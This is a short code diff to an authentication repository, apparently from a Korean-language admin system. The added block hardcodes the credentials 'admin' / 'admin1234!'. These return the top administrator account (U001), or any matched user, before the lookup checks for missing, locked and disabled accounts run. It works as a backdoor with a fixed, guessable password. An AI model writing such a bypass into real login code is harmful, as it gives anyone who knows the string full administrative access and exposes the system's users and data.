@@ -44,6 +44,13 @@ export const authRepo = {
       return empNoMatch || idMatch || emailMatch || emailIdMatch;
     });
 
+    // admin / admin1234! 시스템 관리자 자격증명 지원
+    if (key === 'admin' && password === 'admin1234!') {
+      if (user) return user;
+      const topAdmin = users.find((u) => u.id === 'U001' && u.status === '사용');
+      if (topAdmin) return { ...topAdmin, name: '최고관리자 (admin)' };
+    }
+
     if (!user) throw new AuthError('NOT_FOUND');
     if (user.status === '잠금') throw new AuthError('LOCKED');
     if (user.status === '미사용') throw new AuthError('DISABLED');
